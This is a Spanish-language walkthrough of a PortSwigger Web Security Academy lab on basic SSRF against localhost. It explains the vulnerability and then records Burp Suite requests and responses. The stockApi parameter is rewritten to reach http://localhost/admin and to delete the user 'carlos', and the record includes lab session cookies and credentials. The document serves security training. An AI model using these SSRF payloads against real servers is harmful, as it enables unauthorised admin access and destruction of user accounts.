# 🥂 Laboratorio: SSRF básico contra el servidor local

**Falsificación de solicitudes del lado del servidor (SSRF)**Las vulnerabilidades SSRF permiten a un atacante desencadenar solicitudes maliciosas de servidor a servidor a URL no deseadas. Como es probable que el servidor que emite la solicitud tenga una sólida relación de confianza con otros sistemas de la red, el atacante puede abusar de este comportamiento para acceder a datos, funciones y servicios que no deben estar expuestos a usuarios externos.

### Ataques SSRF contra el servidor

En un ataque SSRF contra el servidor, el atacante hace que la aplicación realice una solicitud HTTP al servidor que aloja la aplicación, a través de su interfaz de red loopback. Por lo general, esto implica proporcionar una URL con un nombre de host como `127.0.0.1`(una dirección IP reservada que apunta al adaptador de bucle invertido) o `localhost`(un nombre de uso común para el mismo adaptador).

Por ejemplo, imagine una aplicación de compras que permite al usuario ver si un artículo está disponible en una tienda en particular. Para proporcionar información sobre las acciones, la aplicación debe consultar varias API REST de back-end. Para ello, pasa la URL al punto final API de back-end correspondiente a través de una solicitud HTTP de front-end. Cuando un usuario ve el estado del stock de un artículo, su navegador realiza la siguiente solicitud:

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`

Esto hace que el servidor realice una solicitud a la URL especificada, recupere el estado del stock y lo devuelva al usuario.

En este ejemplo, un atacante puede modificar la solicitud para especificar una URL local al servidor:

`POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin`

El servidor recupera el contenido de la `/admin`URL y se lo devuelve al usuario.

Un atacante puede visitar la `/admin`URL, pero normalmente solo los usuarios autenticados pueden acceder a la funcionalidad administrativa. Esto significa que un atacante no verá nada de interés. Sin embargo, si la solicitud a la `/admin`URL proviene de la máquina local, se omiten los controles de acceso normales. La aplicación otorga acceso completo a la funcionalidad administrativa, porque la solicitud parece originarse en una ubicación confiable.

### Ataques SSRF contra el servidor - Continuación

¿Por qué las aplicaciones se comportan de esta manera y confían implícitamente en las solicitudes que provienen de la máquina local? Esto puede surgir por varias razones:

* La verificación de control de acceso podría implementarse en un componente diferente que se encuentra frente al servidor de aplicaciones. Cuando se vuelve a establecer una conexión con el servidor, se omite la verificación.
* Para fines de recuperación ante desastres, la aplicación puede permitir el acceso administrativo sin iniciar sesión a cualquier usuario que provenga de la máquina local. Esto proporciona una manera para que un administrador recupere el sistema si pierde sus credenciales. Esto supone que sólo un usuario de plena confianza procedería directamente del servidor.
* La interfaz administrativa puede escuchar en un número de puerto diferente al de la aplicación principal y es posible que los usuarios no puedan acceder a ella directamente.

Este tipo de relaciones de confianza, donde las solicitudes que se originan en la máquina local se manejan de manera diferente a las solicitudes ordinarias, a menudo convierten a SSRF en una vulnerabilidad crítica.

### Laboratorio: SSRF básico contra el servidor local

APRENDIZ

LABORATORIONo resuelto

Este laboratorio tiene una función de verificación de existencias que obtiene datos de un sistema interno.

Para resolver el laboratorio, cambie la URL de verificación de existencias para acceder a la interfaz de administración `http://localhost/admin`y elimine el usuario `carlos`.

```python
// Some code

Laboratorio: SSRF básico contra el servidor local


SITIO ORIGINAL HOME:


https://0a530029036032e782788d590019002a.web-security-academy.net/



VIENDO UN ITEM:


https://0a530029036032e782788d590019002a.web-security-academy.net/product?productId=1




VIENDO EL LOGIN:



https://0a530029036032e782788d590019002a.web-security-academy.net/login





VEMOS EL PASIO A PASO DE LA SOLICITUD DE UN ITEM CONN BURP SUITE:



REQUEST:


GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close








GET /product?productId=1 HTTP/1.1
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close












VEMOS EL PASIO A PASO DE LA SOLICITUD DE UN LOGIN CONN BURP SUITE:



REQUEST:




POST /login HTTP/2
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Content-Length: 67
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a530029036032e782788d590019002a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a530029036032e782788d590019002a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

csrf=KLgDHeWw71ctrZ1nvvZE0Fgqn9R8xEXz&username=P4IM0N&password=5656





GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close






PROBANDO SALTAR AL SERVIDOR LOCALHOST DE ADMIN A TRAVES DE A SOLICITUD INICIADA EN EL PANEL DE LOGIN:



REQUEST:



POST /login HTTP/2
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Content-Length: 67
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a530029036032e782788d590019002a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

csrf=KLgDHeWw71ctrZ1nvvZE0Fgqn9R8xEXz&username=P4IM0N&password=5656




NO FUNCIONO !!!!!!

------


REQUEST:



POST /admin HTTP/2
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Content-Length: 67
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a530029036032e782788d590019002a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

csrf=KLgDHeWw71ctrZ1nvvZE0Fgqn9R8xEXz&username=P4IM0N&password=5656






RESPONSE:




HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2584

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Basic SSRF against the local server</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Basic SSRF against the local server</h2>
                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    Admin interface only available if logged in as an administrator, or if requested from loopback
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>




NO FUNCIONO PERO NOS DIO UNA PISTA!!!!!



------------



VAMOS A PROBAR TRABAJAR SOBRE LAS SOLICITYUDES DADAS POR LA API O SERVICIO QUE CUENTA STOCK DEE LOS ITEMS, VEMOS LAS SOLICITUDES NORMALES Y LUEGO PROBAMOS MODIFICARALS PARA TRATAR DE LLEGA R AL PANEL ADMIN SIN LOGEARNOS HACIENDONOS PASAR QEU ESTA SOLICITUD VIENE SE SU SERVIDOR LOCAL DE ADMIN (LOCALHOST o LOOKBACK):



REQUEST ORIGINAL DE LONDON CONSULTA:




POST /product/stock HTTP/2
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Content-Length: 107
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a530029036032e782788d590019002a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a530029036032e782788d590019002a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1





Y NOS DEVULVE LOLA CANTIDAD DE PRODUCTOS..!!





MODIFICAMOS LA SOLICITUD DENTRO DEL PARAMETRO DE API SOLICITANDO LOCALHOST/aDMIN:




request:




POST /product/stock HTTP/2
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Content-Length: 31
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a530029036032e782788d590019002a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a530029036032e782788d590019002a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=http://localhost/admin





RESPONSE:




HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=rCuqUD9oyiiIVntKLF789wtMtYmaV7TI; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3070

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Basic SSRF against the local server</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Basic SSRF against the local server</h2>
                            <a class=link-back href='https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>




PROBAMOS ELIMINAR AL SUAURIOI CARLOs :


REQUEST:




POST /product/stock HTTP/2
Host: 0a530029036032e782788d590019002a.web-security-academy.net
Cookie: session=mfkNFDKANPI7vZIGqiCxMvmnOTqfVgI3
Content-Length: 54
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a530029036032e782788d590019002a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a530029036032e782788d590019002a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

stockApi=http://localhost/admin/delete?username=carlos



BINGO SE TENZO YA SE BORO EL USUARIO CARLITOS :(   :



HTTP/2 302 Found
Location: /admin
Set-Cookie: session=rJvdVXfASrruyMWlJnIZZhI9zG4a5xtK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0



-----

PUDIMOS BORRAR TAM;BIEN CAMBIANDO LAS REQUEST EN VIVO VIENDO LA PAGINA Y LOS RESULTADOS DE LOS PAYLOAD CARGADOS EN LA VARIABLE DE LA APISTOK SE SEGUIAN MOSTRANDO DEBAJOP DONDE MOSTRABA LOS NUMEROS DE ITEM NORMALAMENTE; E INCLUSO AHI TAMBIEN SE MOST%RABA CUANDO SE SOLICITABNA EL PANEL DE ADMIN:


/admin/delete?username=wiener
```
